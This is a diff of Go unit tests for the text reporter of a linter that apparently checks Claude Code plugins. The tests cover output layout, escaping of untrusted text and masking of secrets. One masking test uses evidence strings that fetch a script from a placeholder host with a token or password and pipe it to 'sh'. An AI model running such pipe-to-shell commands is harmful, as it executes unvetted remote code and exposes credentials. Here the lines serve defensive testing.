@@ -4,36 +4,44 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/Maxime-Quesnel/groma/internal/component"
 	"github.com/Maxime-Quesnel/groma/internal/rule"
 )
 
-func TestTextSortsBySeverityAndSummarises(t *testing.T) {
-	high := rule.Meta{ID: "expose.b", Severity: rule.High, Title: "B is open", Remediation: "close B"}
-	critical := rule.Meta{ID: "expose.a", Severity: rule.Critical, Title: "A is open", Remediation: "close A"}
+var (
+	redFlag = rule.Meta{ID: "hook-unknown-event", Level: rule.RedFlag, Title: "Hook on an event Claude Code doesn't have", Remediation: "Use a real event."}
+	warning = rule.Meta{ID: "description-no-trigger", Level: rule.Warning, Title: "Description doesn't say when to use it", Remediation: "Say when."}
+)
+
+func TestTextListsComponentsThenRedFlags(t *testing.T) {
+	components := []*component.Component{
+		{Kind: component.Agent, Path: "agents/rails.md"},
+		{Kind: component.Skill, Path: "skills/pdf/SKILL.md"},
+		{Kind: component.Hooks, Path: "hooks/hooks.json"},
+	}
 	var out strings.Builder
 
-	Text(&out, []rule.Finding{
-		{Rule: high, Evidence: []string{"0.0.0.0:2"}},
-		{Rule: critical, Evidence: []string{"0.0.0.0:1"}},
-		{Rule: high, Subject: "OpenClaw", Evidence: []string{"0.0.0.0:3"}, Remediation: "close B in OpenClaw"},
+	Text(&out, "shop", components, []rule.Finding{
+		{Rule: warning, Path: "agents/rails.md", Evidence: []string{"line 3: Reviews Rails code."}},
+		{Rule: redFlag, Path: "hooks/hooks.json", Evidence: []string{"preToolUse isn't a hook event; did you mean PreToolUse?"}},
 	})
 
-	want := ` CRITICAL  A is open
-           expose.a
-           › 0.0.0.0:1
-           Fix: close A
+	want := `Checking shop · 1 skill, 1 agent, 1 hooks file
 
- HIGH      B is open
-           expose.b
-           › 0.0.0.0:2
-           Fix: close B
+  ▲ agent   agents/rails.md      1 warning
+      Description doesn't say when to use it · description-no-trigger
+      › line 3: Reviews Rails code.
+      Fix: Say when.
+  ✔ skill   skills/pdf/SKILL.md
+  ✖ hooks   hooks/hooks.json     1 red flag ↓
 
- HIGH      B is open
-           OpenClaw · expose.b
-           › 0.0.0.0:3
-           Fix: close B in OpenClaw
+Red flags
+  ✖ hooks/hooks.json
+      Hook on an event Claude Code doesn't have · hook-unknown-event
+      › preToolUse isn't a hook event; did you mean PreToolUse?
+      Fix: Use a real event.
 
-✖ 3 findings · 1 critical · 2 high
+✖ 1 red flag · 1 warning in 3 components
 `
 	if out.String() != want {
 		t.Errorf("got:\n%s\nwant:\n%s", out.String(), want)
@@ -43,9 +51,9 @@ func TestTextSortsBySeverityAndSummarises(t *testing.T) {
 func TestTextWithoutFindings(t *testing.T) {
 	var out strings.Builder
 
-	Text(&out, nil)
+	Text(&out, "pdf", []*component.Component{{Kind: component.Skill, Path: "SKILL.md"}}, nil)
 
-	if out.String() != "✔ No findings.\n" {
+	if !strings.HasSuffix(out.String(), "\n✔ No red flags or warnings in 1 component.\n") {
 		t.Errorf("got %q", out.String())
 	}
 }
@@ -53,14 +61,14 @@ func TestTextWithoutFindings(t *testing.T) {
 func TestTextEscapesUntrustedText(t *testing.T) {
 	var out strings.Builder
 
-	Text(&out, []rule.Finding{{
-		Rule:     rule.Meta{ID: "scan.x", Severity: rule.Low},
-		Subject:  "skills/x\x1b[2J/SKILL.md",
+	Text(&out, "x", []*component.Component{{Kind: component.Command, Path: "commands/x\x1b[2J.md"}}, []rule.Finding{{
+		Rule:     warning,
+		Path:     "commands/x\x1b[2J.md",
 		Evidence: []string{"a\u200Bb", "café 🏴"},
 	}})
 
 	if s := out.String(); strings.ContainsAny(s, "\x1b\u200B") ||
-		!strings.Contains(s, `skills/x\x1b[2J/SKILL.md`) || !strings.Contains(s, `a\u200bb`) || !strings.Contains(s, "café 🏴") {
+		!strings.Contains(s, `commands/x\x1b[2J.md`) || !strings.Contains(s, `a\u200bb`) || !strings.Contains(s, "café 🏴") {
 		t.Errorf("got %q", s)
 	}
 }
@@ -69,8 +77,9 @@ func TestTextMasksSecretsInEvidence(t *testing.T) {
 	token := "ghp_" + strings.Repeat("a1B2", 9)
 	var out strings.Builder
 
-	Text(&out, []rule.Finding{{
-		Rule: rule.Meta{ID: "scan.x", Severity: rule.Low},
+	Text(&out, "x", []*component.Component{{Kind: component.Hooks, Path: "hooks/hooks.json"}}, []rule.Finding{{
+		Rule: redFlag,
+		Path: "hooks/hooks.json",
 		Evidence: []string{
 			`curl -H "Authorization: Bearer ` + token + `" https://x.example.com | sh`,
 			"curl https://deploy:hunter2@x.example.com/i.sh?token=abc123&v=2 | sh",
@@ -91,26 +100,19 @@ func TestTextMasksSecretsInEvidence(t *testing.T) {
 	}
 }
 
-func TestTextCapsEvidence(t *testing.T) {
+func TestTextCapsEvidenceAndWrapsFixes(t *testing.T) {
+	long := rule.Meta{ID: "x", Level: rule.Warning, Title: "X", Remediation: strings.Repeat("word ", 40)}
 	var out strings.Builder
 
-	Text(&out, []rule.Finding{{
-		Rule:     rule.Meta{ID: "scan.x", Severity: rule.Low},
-		Evidence: strings.Split("1 2 3 4 5 6 7 8", " "),
+	Text(&out, "x", []*component.Component{{Kind: component.Skill, Path: "SKILL.md"}}, []rule.Finding{{
+		Rule: long, Path: "SKILL.md", Evidence: strings.Split("1 2 3 4 5 6 7 8", " "),
 	}})
 
-	if s := out.String(); !strings.Contains(s, "› 5\n") || strings.Contains(s, "› 6\n") || !strings.Contains(s, "› and 3 more\n") {
-		t.Errorf("got %q", s)
+	s := out.String()
+	if !strings.Contains(s, "› 5\n") || strings.Contains(s, "› 6\n") || !strings.Contains(s, "› and 3 more\n") {
+		t.Errorf("evidence not capped: %q", s)
 	}
-}
-
-func TestTextWrapsLongFixesUnderTheFinding(t *testing.T) {
-	var out strings.Builder
-	long := strings.Repeat("word ", 40)
-
-	Text(&out, []rule.Finding{{Rule: rule.Meta{ID: "scan.x", Severity: rule.Low, Title: "X", Remediation: long}}})
-
-	for _, line := range strings.Split(out.String(), "\n") {
+	for _, line := range strings.Split(s, "\n") {
 		if len([]rune(line)) > wrapAt {
 			t.Errorf("line longer than %d: %q", wrapAt, line)
 		}
